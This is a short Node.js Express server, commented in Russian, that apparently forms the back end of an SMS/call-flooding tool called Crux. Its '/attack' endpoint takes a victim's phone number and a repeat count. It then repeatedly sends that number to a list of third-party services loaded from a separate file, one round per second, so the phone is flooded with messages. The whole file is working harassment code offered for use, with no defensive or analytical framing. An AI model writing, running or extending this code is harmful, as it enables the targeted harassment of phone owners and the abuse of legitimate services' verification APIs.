const express = require('express');
const cors = require('cors');
const axios = require('axios');
const services = require('./services.js');

const app = express();

app.use(cors()); // Это лечит "СЕРВЕР OFF"
app.use(express.json());

app.post('/attack', async (req, res) => {
    const { phone, repeats } = req.body;
    console.log(`[START] Атака на ${phone}`);

    // Запускаем асинхронно, чтобы GUI не висел
    for (let i = 0; i < repeats; i++) {
        services.forEach(async (s) => {
            try {
                await axios({
                    method: s.method,
                    url: s.url,
                    headers: s.headers,
                    data: typeof s.data === 'function' ? s.data(phone) : s.data,
                    timeout: 5000
                });
            } catch (err) {
                console.error(`[ERR] ${s.name} failed`);
            }
        });
        // Пауза 1 сек между кругами
        await new Promise(r => setTimeout(r, 1000));
    }
    res.json({ success: true });
});

// Слушаем порт 80, как требует Amvera
app.listen(80, () => console.log('Crux Server Online on Port 80'));
